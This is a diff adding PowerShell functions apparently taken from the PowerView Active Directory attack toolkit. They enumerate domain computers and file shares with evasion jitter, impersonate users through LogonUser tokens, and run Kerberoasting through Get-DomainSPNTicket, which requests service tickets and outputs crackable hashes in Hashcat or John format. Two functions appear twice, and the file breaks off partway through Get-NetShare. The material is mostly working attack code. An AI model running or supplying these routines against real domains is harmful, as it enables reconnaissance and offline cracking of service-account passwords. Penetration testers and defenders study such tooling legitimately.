@@ -1,0 +1,1253 @@
+function Find-DomainShare {
+
+    [Diagnostics.CodeAnalysis.SuppressMessageAttribute('PSShouldProcess', '')]
+    [OutputType('PowerView.ShareInfo')]
+    Param(
+        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+        [Alias('DNSHostName')]
+        [String[]]
+        $ComputerName,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('Domain')]
+        [String]
+        $ComputerDomain,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ComputerLDAPFilter,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ComputerSearchBase,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('OperatingSystem')]
+        [String]
+        $ComputerOperatingSystem,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('ServicePack')]
+        [String]
+        $ComputerServicePack,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('SiteName')]
+        [String]
+        $ComputerSiteName,
+
+        [Alias('CheckAccess')]
+        [Switch]
+        $CheckShareAccess,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('DomainController')]
+        [String]
+        $Server,
+
+        [ValidateSet('Base', 'OneLevel', 'Subtree')]
+        [String]
+        $SearchScope = 'Subtree',
+
+        [ValidateRange(1, 10000)]
+        [Int]
+        $ResultPageSize = 200,
+
+        [ValidateRange(1, 10000)]
+        [Int]
+        $ServerTimeLimit,
+
+        [Switch]
+        $Tombstone,
+
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [ValidateRange(1, 10000)]
+        [Int]
+        $Delay = 0,
+
+        [ValidateRange(0.0, 1.0)]
+        [Double]
+        $Jitter = .3,
+
+        [Int]
+        [ValidateRange(1, 100)]
+        $Threads = 20
+    )
+
+    BEGIN {
+
+        $ComputerSearcherArguments = @{
+            'Properties' = 'dnshostname'
+        }
+        if ($PSBoundParameters['ComputerDomain']) { $ComputerSearcherArguments['Domain'] = $ComputerDomain }
+        if ($PSBoundParameters['ComputerLDAPFilter']) { $ComputerSearcherArguments['LDAPFilter'] = $ComputerLDAPFilter }
+        if ($PSBoundParameters['ComputerSearchBase']) { $ComputerSearcherArguments['SearchBase'] = $ComputerSearchBase }
+        if ($PSBoundParameters['Unconstrained']) { $ComputerSearcherArguments['Unconstrained'] = $Unconstrained }
+        if ($PSBoundParameters['ComputerOperatingSystem']) { $ComputerSearcherArguments['OperatingSystem'] = $OperatingSystem }
+        if ($PSBoundParameters['ComputerServicePack']) { $ComputerSearcherArguments['ServicePack'] = $ServicePack }
+        if ($PSBoundParameters['ComputerSiteName']) { $ComputerSearcherArguments['SiteName'] = $SiteName }
+        if ($PSBoundParameters['Server']) { $ComputerSearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $ComputerSearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $ComputerSearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $ComputerSearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['Tombstone']) { $ComputerSearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $ComputerSearcherArguments['Credential'] = $Credential }
+
+        if ($PSBoundParameters['ComputerName']) {
+            $TargetComputers = $ComputerName
+        }
+        else {
+            Write-Verbose '[Find-DomainShare] Querying computers in the domain'
+            $TargetComputers = Get-DomainComputer @ComputerSearcherArguments | Select-Object -ExpandProperty dnshostname
+        }
+        Write-Verbose "[Find-DomainShare] TargetComputers length: $($TargetComputers.Length)"
+        if ($TargetComputers.Length -eq 0) {
+            throw '[Find-DomainShare] No hosts found to enumerate'
+        }
+
+        # the host enumeration block we're using to enumerate all servers
+        $HostEnumBlock = {
+            Param($ComputerName, $CheckShareAccess, $TokenHandle)
+
+            if ($TokenHandle) {
+                # impersonate the the token produced by LogonUser()/Invoke-UserImpersonation
+                $Null = Invoke-UserImpersonation -TokenHandle $TokenHandle -Quiet
+            }
+
+            ForEach ($TargetComputer in $ComputerName) {
+                $Up = Test-Connection -Count 1 -Quiet -ComputerName $TargetComputer
+                if ($Up) {
+                    # get the shares for this host and check what we find
+                    $Shares = Get-NetShare -ComputerName $TargetComputer
+                    ForEach ($Share in $Shares) {
+                        $ShareName = $Share.Name
+                        # $Remark = $Share.Remark
+                        $Path = '\\'+$TargetComputer+'\'+$ShareName
+
+                        if (($ShareName) -and ($ShareName.trim() -ne '')) {
+                            # see if we want to check access to this share
+                            if ($CheckShareAccess) {
+                                # check if the user has access to this path
+                                try {
+                                    $Null = [IO.Directory]::GetFiles($Path)
+                                    $Share
+                                }
+                                catch {
+                                    Write-Verbose "Error accessing share path $Path : $_"
+                                }
+                            }
+                            else {
+                                $Share
+                            }
+                        }
+                    }
+                }
+            }
+
+            if ($TokenHandle) {
+                Invoke-RevertToSelf
+            }
+        }
+
+        $LogonToken = $Null
+        if ($PSBoundParameters['Credential']) {
+            if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
+                $LogonToken = Invoke-UserImpersonation -Credential $Credential
+            }
+            else {
+                $LogonToken = Invoke-UserImpersonation -Credential $Credential -Quiet
+            }
+        }
+    }
+
+    PROCESS {
+        # only ignore threading if -Delay is passed
+        if ($PSBoundParameters['Delay'] -or $PSBoundParameters['StopOnSuccess']) {
+
+            Write-Verbose "[Find-DomainShare] Total number of hosts: $($TargetComputers.count)"
+            Write-Verbose "[Find-DomainShare] Delay: $Delay, Jitter: $Jitter"
+            $Counter = 0
+            $RandNo = New-Object System.Random
+
+            ForEach ($TargetComputer in $TargetComputers) {
+                $Counter = $Counter + 1
+
+                # sleep for our semi-randomized interval
+                Start-Sleep -Seconds $RandNo.Next((1-$Jitter)*$Delay, (1+$Jitter)*$Delay)
+
+                Write-Verbose "[Find-DomainShare] Enumerating server $TargetComputer ($Counter of $($TargetComputers.count))"
+                Invoke-Command -ScriptBlock $HostEnumBlock -ArgumentList $TargetComputer, $CheckShareAccess, $LogonToken
+            }
+        }
+        else {
+            Write-Verbose "[Find-DomainShare] Using threading with threads: $Threads"
+
+            # if we're using threading, kick off the script block with New-ThreadedFunction
+            $ScriptParams = @{
+                'CheckShareAccess' = $CheckShareAccess
+                'TokenHandle' = $LogonToken
+            }
+
+            # if we're using threading, kick off the script block with New-ThreadedFunction using the $HostEnumBlock + params
+            New-ThreadedFunction -ComputerName $TargetComputers -ScriptBlock $HostEnumBlock -ScriptParameters $ScriptParams -Threads $Threads
+        }
+    }
+
+    END {
+        if ($LogonToken) {
+            Invoke-RevertToSelf -TokenHandle $LogonToken
+        }
+    }
+}
+
+
+function Get-DomainComputer {
+
+
+    [OutputType('PowerView.Computer')]
+    [OutputType('PowerView.Computer.Raw')]
+    [CmdletBinding()]
+    Param (
+        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+        [Alias('SamAccountName', 'Name', 'DNSHostName')]
+        [String[]]
+        $Identity,
+
+        [Switch]
+        $Unconstrained,
+
+        [Switch]
+        $TrustedToAuth,
+
+        [Switch]
+        $Printers,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('ServicePrincipalName')]
+        [String]
+        $SPN,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $OperatingSystem,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $ServicePack,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $SiteName,
+
+        [Switch]
+        $Ping,
+
+        [ValidateNotNullOrEmpty()]
+        [String]
+        $Domain,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('Filter')]
+        [String]
+        $LDAPFilter,
+
+        [ValidateNotNullOrEmpty()]
+        [String[]]
+        $Properties,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('ADSPath')]
+        [String]
+        $SearchBase,
+
+        [ValidateNotNullOrEmpty()]
+        [Alias('DomainController')]
+        [String]
+        $Server,
+
+        [ValidateSet('Base', 'OneLevel', 'Subtree')]
+        [String]
+        $SearchScope = 'Subtree',
+
+        [ValidateRange(1, 10000)]
+        [Int]
+        $ResultPageSize = 200,
+
+        [ValidateRange(1, 10000)]
+        [Int]
+        $ServerTimeLimit,
+
+        [ValidateSet('Dacl', 'Group', 'None', 'Owner', 'Sacl')]
+        [String]
+        $SecurityMasks,
+
+        [Switch]
+        $Tombstone,
+
+        [Alias('ReturnOne')]
+        [Switch]
+        $FindOne,
+
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty,
+
+        [Switch]
+        $Raw
+    )
+
+    DynamicParam {
+        $UACValueNames = [Enum]::GetNames($UACEnum)
+        # add in the negations
+        $UACValueNames = $UACValueNames | ForEach-Object {$_; "NOT_$_"}
+        # create new dynamic parameter
+        New-DynamicParameter -Name UACFilter -ValidateSet $UACValueNames -Type ([array])
+    }
+
+    BEGIN {
+        $SearcherArguments = @{}
+        if ($PSBoundParameters['Domain']) { $SearcherArguments['Domain'] = $Domain }
+        if ($PSBoundParameters['Properties']) { $SearcherArguments['Properties'] = $Properties }
+        if ($PSBoundParameters['SearchBase']) { $SearcherArguments['SearchBase'] = $SearchBase }
+        if ($PSBoundParameters['Server']) { $SearcherArguments['Server'] = $Server }
+        if ($PSBoundParameters['SearchScope']) { $SearcherArguments['SearchScope'] = $SearchScope }
+        if ($PSBoundParameters['ResultPageSize']) { $SearcherArguments['ResultPageSize'] = $ResultPageSize }
+        if ($PSBoundParameters['ServerTimeLimit']) { $SearcherArguments['ServerTimeLimit'] = $ServerTimeLimit }
+        if ($PSBoundParameters['SecurityMasks']) { $SearcherArguments['SecurityMasks'] = $SecurityMasks }
+        if ($PSBoundParameters['Tombstone']) { $SearcherArguments['Tombstone'] = $Tombstone }
+        if ($PSBoundParameters['Credential']) { $SearcherArguments['Credential'] = $Credential }
+        $CompSearcher = Get-DomainSearcher @SearcherArguments
+    }
+
+    PROCESS {
+        #bind dynamic parameter to a friendly variable
+        if ($PSBoundParameters -and ($PSBoundParameters.Count -ne 0)) {
+            New-DynamicParameter -CreateVariables -BoundParameters $PSBoundParameters
+        }
+
+        if ($CompSearcher) {
+            $IdentityFilter = ''
+            $Filter = ''
+            $Identity | Where-Object {$_} | ForEach-Object {
+                $IdentityInstance = $_.Replace('(', '\28').Replace(')', '\29')
+                if ($IdentityInstance -match '^S-1-') {
+                    $IdentityFilter += "(objectsid=$IdentityInstance)"
+                }
+                elseif ($IdentityInstance -match '^CN=') {
+                    $IdentityFilter += "(distinguishedname=$IdentityInstance)"
+                    if ((-not $PSBoundParameters['Domain']) -and (-not $PSBoundParameters['SearchBase'])) {
+                        # if a -Domain isn't explicitly set, extract the object domain out of the distinguishedname
+                        #   and rebuild the domain searcher
+                        $IdentityDomain = $IdentityInstance.SubString($IdentityInstance.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        Write-Verbose "[Get-DomainComputer] Extracted domain '$IdentityDomain' from '$IdentityInstance'"
+                        $SearcherArguments['Domain'] = $IdentityDomain
+                        $CompSearcher = Get-DomainSearcher @SearcherArguments
+                        if (-not $CompSearcher) {
+                            Write-Warning "[Get-DomainComputer] Unable to retrieve domain searcher for '$IdentityDomain'"
+                        }
+                    }
+                }
+                elseif ($IdentityInstance.Contains('.')) {
+                    $IdentityFilter += "(|(name=$IdentityInstance)(dnshostname=$IdentityInstance))"
+                }
+                elseif ($IdentityInstance -imatch '^[0-9A-F]{8}-([0-9A-F]{4}-){3}[0-9A-F]{12}$') {
+                    $GuidByteString = (([Guid]$IdentityInstance).ToByteArray() | ForEach-Object { '\' + $_.ToString('X2') }) -join ''
+                    $IdentityFilter += "(objectguid=$GuidByteString)"
+                }
+                else {
+                    $IdentityFilter += "(name=$IdentityInstance)"
+                }
+            }
+            if ($IdentityFilter -and ($IdentityFilter.Trim() -ne '') ) {
+                $Filter += "(|$IdentityFilter)"
+            }
+
+            if ($PSBoundParameters['Unconstrained']) {
+                Write-Verbose '[Get-DomainComputer] Searching for computers with for unconstrained delegation'
+                $Filter += '(userAccountControl:1.2.840.113556.1.4.803:=524288)'
+            }
+            if ($PSBoundParameters['TrustedToAuth']) {
+                Write-Verbose '[Get-DomainComputer] Searching for computers that are trusted to authenticate for other principals'
+                $Filter += '(msds-allowedtodelegateto=*)'
+            }
+            if ($PSBoundParameters['Printers']) {
+                Write-Verbose '[Get-DomainComputer] Searching for printers'
+                $Filter += '(objectCategory=printQueue)'
+            }
+            if ($PSBoundParameters['SPN']) {
+                Write-Verbose "[Get-DomainComputer] Searching for computers with SPN: $SPN"
+                $Filter += "(servicePrincipalName=$SPN)"
+            }
+            if ($PSBoundParameters['OperatingSystem']) {
+                Write-Verbose "[Get-DomainComputer] Searching for computers with operating system: $OperatingSystem"
+                $Filter += "(operatingsystem=$OperatingSystem)"
+            }
+            if ($PSBoundParameters['ServicePack']) {
+                Write-Verbose "[Get-DomainComputer] Searching for computers with service pack: $ServicePack"
+                $Filter += "(operatingsystemservicepack=$ServicePack)"
+            }
+            if ($PSBoundParameters['SiteName']) {
+                Write-Verbose "[Get-DomainComputer] Searching for computers with site name: $SiteName"
+                $Filter += "(serverreferencebl=$SiteName)"
+            }
+            if ($PSBoundParameters['LDAPFilter']) {
+                Write-Verbose "[Get-DomainComputer] Using additional LDAP filter: $LDAPFilter"
+                $Filter += "$LDAPFilter"
+            }
+            # build the LDAP filter for the dynamic UAC filter value
+            $UACFilter | Where-Object {$_} | ForEach-Object {
+                if ($_ -match 'NOT_.*') {
+                    $UACField = $_.Substring(4)
+                    $UACValue = [Int]($UACEnum::$UACField)
+                    $Filter += "(!(userAccountControl:1.2.840.113556.1.4.803:=$UACValue))"
+                }
+                else {
+                    $UACValue = [Int]($UACEnum::$_)
+                    $Filter += "(userAccountControl:1.2.840.113556.1.4.803:=$UACValue)"
+                }
+            }
+
+            $CompSearcher.filter = "(&(samAccountType=805306369)$Filter)"
+            Write-Verbose "[Get-DomainComputer] Get-DomainComputer filter string: $($CompSearcher.filter)"
+
+            if ($PSBoundParameters['FindOne']) { $Results = $CompSearcher.FindOne() }
+            else { $Results = $CompSearcher.FindAll() }
+            $Results | Where-Object {$_} | ForEach-Object {
+                $Up = $True
+                if ($PSBoundParameters['Ping']) {
+                    $Up = Test-Connection -Count 1 -Quiet -ComputerName $_.properties.dnshostname
+                }
+                if ($Up) {
+                    if ($PSBoundParameters['Raw']) {
+                        # return raw result objects
+                        $Computer = $_
+                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer.Raw')
+                    }
+                    else {
+                        $Computer = Convert-LDAPProperty -Properties $_.Properties
+                        $Computer.PSObject.TypeNames.Insert(0, 'PowerView.Computer')
+                    }
+                    $Computer
+                }
+            }
+            if ($Results) {
+                try { $Results.dispose() }
+                catch {
+                    Write-Verbose "[Get-DomainComputer] Error disposing of the Results object: $_"
+                }
+            }
+            $CompSearcher.dispose()
+        }
+    }
+}
+
+function Invoke-UserImpersonation {
+
+    [OutputType([IntPtr])]
+    [CmdletBinding(DefaultParameterSetName = 'Credential')]
+    Param(
+        [Parameter(Mandatory = $True, ParameterSetName = 'Credential')]
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential,
+
+        [Parameter(Mandatory = $True, ParameterSetName = 'TokenHandle')]
+        [ValidateNotNull()]
+        [IntPtr]
+        $TokenHandle,
+
+        [Switch]
+        $Quiet
+    )
+
+    if (([System.Threading.Thread]::CurrentThread.GetApartmentState() -ne 'STA') -and (-not $PSBoundParameters['Quiet'])) {
+        Write-Warning "[Invoke-UserImpersonation] powershell.exe is not currently in a single-threaded apartment state, token impersonation may not work."
+    }
+
+    if ($PSBoundParameters['TokenHandle']) {
+        $LogonTokenHandle = $TokenHandle
+    }
+    else {
+        $LogonTokenHandle = [IntPtr]::Zero
+        $NetworkCredential = $Credential.GetNetworkCredential()
+        $UserDomain = $NetworkCredential.Domain
+        $UserName = $NetworkCredential.UserName
+        Write-Warning "[Invoke-UserImpersonation] Executing LogonUser() with user: $($UserDomain)\$($UserName)"
+
+        # LOGON32_LOGON_NEW_CREDENTIALS = 9, LOGON32_PROVIDER_WINNT50 = 3
+        #   this is to simulate "runas.exe /netonly" functionality
+        $Result = $Advapi32::LogonUser($UserName, $UserDomain, $NetworkCredential.Password, 9, 3, [ref]$LogonTokenHandle);$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
+
+        if (-not $Result) {
+            throw "[Invoke-UserImpersonation] LogonUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+        }
+    }
+
+    # actually impersonate the token from LogonUser()
+    $Result = $Advapi32::ImpersonateLoggedOnUser($LogonTokenHandle)
+
+    if (-not $Result) {
+        throw "[Invoke-UserImpersonation] ImpersonateLoggedOnUser() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+    }
+
+    Write-Verbose "[Invoke-UserImpersonation] Alternate credentials successfully impersonated"
+    $LogonTokenHandle
+}
+
+
+function Invoke-RevertToSelf {
+
+    [CmdletBinding()]
+    Param(
+        [ValidateNotNull()]
+        [IntPtr]
+        $TokenHandle
+    )
+
+    if ($PSBoundParameters['TokenHandle']) {
+        Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
+        $Result = $Kernel32::CloseHandle($TokenHandle)
+    }
+
+    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
+
+    if (-not $Result) {
+        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+    }
+
+    Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
+}
+
+
+function Get-DomainSPNTicket {
+
+
+    [OutputType('PowerView.SPNTicket')]
+    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
+    Param (
+        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
+        [ValidatePattern('.*/.*')]
+        [Alias('ServicePrincipalName')]
+        [String[]]
+        $SPN,
+
+        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
+        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
+        [Object[]]
+        $User,
+
+        [ValidateSet('John', 'Hashcat')]
+        [Alias('Format')]
+        [String]
+        $OutputFormat = 'Hashcat',
+
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )
+
+    BEGIN {
+        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
+
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+        }
+    }
+
+    PROCESS {
+        if ($PSBoundParameters['User']) {
+            $TargetObject = $User
+        }
+        else {
+            $TargetObject = $SPN
+        }
+
+        ForEach ($Object in $TargetObject) {
+            if ($PSBoundParameters['User']) {
+                $UserSPN = $Object.ServicePrincipalName
+                $SamAccountName = $Object.SamAccountName
+                $DistinguishedName = $Object.DistinguishedName
+            }
+            else {
+                $UserSPN = $Object
+                $SamAccountName = 'UNKNOWN'
+                $DistinguishedName = 'UNKNOWN'
+            }
+
+            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
+            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
+                $UserSPN = $UserSPN[0]
+            }
+
+            try {
+                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
+            }
+            catch {
+                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
+            }
+            if ($Ticket) {
+                $TicketByteStream = $Ticket.GetRequest()
+            }
+            if ($TicketByteStream) {
+                $Out = New-Object PSObject
+
+                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
+
+                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
+                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
+                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
+
+                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
+                # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
+                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
+                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
+                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
+                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
+
+                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
+                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
+                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
+                        $Hash = $null
+                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
+                    } else {
+                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
+                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
+                    }
+                } else {
+                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
+                    $Hash = $null
+                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
+                }
+
+                if($Hash) {
+                    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe...
+                    if ($OutputFormat -match 'John') {
+                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
+                    }
+                    else {
+                        if ($DistinguishedName -ne 'UNKNOWN') {
+                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        }
+                        else {
+                            $UserDomain = 'UNKNOWN'
+                        }
+
+                        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
+                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
+                    }
+                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
+                }
+
+                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
+                $Out
+            }
+        }
+    }
+
+    END {
+        if ($LogonToken) {
+            Invoke-RevertToSelf -TokenHandle $LogonToken
+        }
+    }
+}
+
+function Invoke-RevertToSelf {
+
+
+    [CmdletBinding()]
+    Param(
+        [ValidateNotNull()]
+        [IntPtr]
+        $TokenHandle
+    )
+
+    if ($PSBoundParameters['TokenHandle']) {
+        Write-Warning "[Invoke-RevertToSelf] Reverting token impersonation and closing LogonUser() token handle"
+        $Result = $Kernel32::CloseHandle($TokenHandle)
+    }
+
+    $Result = $Advapi32::RevertToSelf();$LastError = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error();
+
+    if (-not $Result) {
+        throw "[Invoke-RevertToSelf] RevertToSelf() Error: $(([ComponentModel.Win32Exception] $LastError).Message)"
+    }
+
+    Write-Verbose "[Invoke-RevertToSelf] Token impersonation successfully reverted"
+}
+
+
+function Get-DomainSPNTicket {
+
+    [OutputType('PowerView.SPNTicket')]
+    [CmdletBinding(DefaultParameterSetName = 'RawSPN')]
+    Param (
+        [Parameter(Position = 0, ParameterSetName = 'RawSPN', Mandatory = $True, ValueFromPipeline = $True)]
+        [ValidatePattern('.*/.*')]
+        [Alias('ServicePrincipalName')]
+        [String[]]
+        $SPN,
+
+        [Parameter(Position = 0, ParameterSetName = 'User', Mandatory = $True, ValueFromPipeline = $True)]
+        [ValidateScript({ $_.PSObject.TypeNames[0] -eq 'PowerView.User' })]
+        [Object[]]
+        $User,
+
+        [ValidateSet('John', 'Hashcat')]
+        [Alias('Format')]
+        [String]
+        $OutputFormat = 'Hashcat',
+
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )
+
+    BEGIN {
+        $Null = [Reflection.Assembly]::LoadWithPartialName('System.IdentityModel')
+
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+        }
+    }
+
+    PROCESS {
+        if ($PSBoundParameters['User']) {
+            $TargetObject = $User
+        }
+        else {
+            $TargetObject = $SPN
+        }
+
+        ForEach ($Object in $TargetObject) {
+            if ($PSBoundParameters['User']) {
+                $UserSPN = $Object.ServicePrincipalName
+                $SamAccountName = $Object.SamAccountName
+                $DistinguishedName = $Object.DistinguishedName
+            }
+            else {
+                $UserSPN = $Object
+                $SamAccountName = 'UNKNOWN'
+                $DistinguishedName = 'UNKNOWN'
+            }
+
+            # if a user has multiple SPNs we only take the first one otherwise the service ticket request fails miserably :) -@st3r30byt3
+            if ($UserSPN -is [System.DirectoryServices.ResultPropertyValueCollection]) {
+                $UserSPN = $UserSPN[0]
+            }
+
+            try {
+                $Ticket = New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $UserSPN
+            }
+            catch {
+                Write-Warning "[Get-DomainSPNTicket] Error requesting ticket for SPN '$UserSPN' from user '$DistinguishedName' : $_"
+            }
+            if ($Ticket) {
+                $TicketByteStream = $Ticket.GetRequest()
+            }
+            if ($TicketByteStream) {
+                $Out = New-Object PSObject
+
+                $TicketHexStream = [System.BitConverter]::ToString($TicketByteStream) -replace '-'
+
+                $Out | Add-Member Noteproperty 'SamAccountName' $SamAccountName
+                $Out | Add-Member Noteproperty 'DistinguishedName' $DistinguishedName
+                $Out | Add-Member Noteproperty 'ServicePrincipalName' $Ticket.ServicePrincipalName
+
+                # TicketHexStream == GSS-API Frame (see https://tools.ietf.org/html/rfc4121#section-4.1)
+                # No easy way to parse ASN1, so we'll try some janky regex to parse the embedded KRB_AP_REQ.Ticket object
+                if($TicketHexStream -match 'a382....3082....A0030201(?<EtypeLen>..)A1.{1,4}.......A282(?<CipherTextLen>....)........(?<DataToEnd>.+)') {
+                    $Etype = [Convert]::ToByte( $Matches.EtypeLen, 16 )
+                    $CipherTextLen = [Convert]::ToUInt32($Matches.CipherTextLen, 16)-4
+                    $CipherText = $Matches.DataToEnd.Substring(0,$CipherTextLen*2)
+
+                    # Make sure the next field matches the beginning of the KRB_AP_REQ.Authenticator object
+                    if($Matches.DataToEnd.Substring($CipherTextLen*2, 4) -ne 'A482') {
+                        Write-Warning "Error parsing ciphertext for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
+                        $Hash = $null
+                        $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
+                    } else {
+                        $Hash = "$($CipherText.Substring(0,32))`$$($CipherText.Substring(32))"
+                        $Out | Add-Member Noteproperty 'TicketByteHexStream' $null
+                    }
+                } else {
+                    Write-Warning "Unable to parse ticket structure for the SPN  $($Ticket.ServicePrincipalName). Use the TicketByteHexStream field and extract the hash offline with Get-KerberoastHashFromAPReq"
+                    $Hash = $null
+                    $Out | Add-Member Noteproperty 'TicketByteHexStream' ([Bitconverter]::ToString($TicketByteStream).Replace('-',''))
+                }
+
+                if($Hash) {
+                    # JTR jumbo output format - $krb5tgs$SPN/machine.testlab.local:63386d22d359fe...
+                    if ($OutputFormat -match 'John') {
+                        $HashFormat = "`$krb5tgs`$$($Ticket.ServicePrincipalName):$Hash"
+                    }
+                    else {
+                        if ($DistinguishedName -ne 'UNKNOWN') {
+                            $UserDomain = $DistinguishedName.SubString($DistinguishedName.IndexOf('DC=')) -replace 'DC=','' -replace ',','.'
+                        }
+                        else {
+                            $UserDomain = 'UNKNOWN'
+                        }
+
+                        # hashcat output format - $krb5tgs$23$*user$realm$test/spn*$63386d22d359fe...
+                        $HashFormat = "`$krb5tgs`$$($Etype)`$*$SamAccountName`$$UserDomain`$$($Ticket.ServicePrincipalName)*`$$Hash"
+                    }
+                    $Out | Add-Member Noteproperty 'Hash' $HashFormat
+                }
+
+                $Out.PSObject.TypeNames.Insert(0, 'PowerView.SPNTicket')
+                $Out
+            }
+        }
+    }
+
+    END {
+        if ($LogonToken) {
+            Invoke-RevertToSelf -TokenHandle $LogonToken
+        }
+    }
+}
+
+
+function Get-NetShare {
+
+
+    [OutputType('PowerView.ShareInfo')]
+    [CmdletBinding()]
+    Param(
+        [Parameter(Position = 0, ValueFromPipeline = $True, ValueFromPipelineByPropertyName = $True)]
+        [Alias('HostName', 'dnshostname', 'name')]
+        [ValidateNotNullOrEmpty()]
+        [String[]]
+        $ComputerName = 'localhost',
+
+        [Management.Automation.PSCredential]
+        [Management.Automation.CredentialAttribute()]
+        $Credential = [Management.Automation.PSCredential]::Empty
+    )
+
+    BEGIN {
+        if ($PSBoundParameters['Credential']) {
+            $LogonToken = Invoke-UserImpersonation -Credential $Credential
+        }
+    }
+
+    PROCESS {
+        ForEach ($Computer in $ComputerName) {
+            # arguments for NetShareEnum
+            $QueryLevel = 1
+            $PtrInfo = [IntPtr]::Zero
+            $EntriesRead = 0
+            $TotalRead = 0
+            $ResumeHandle = 0
+
+            # get the raw share information
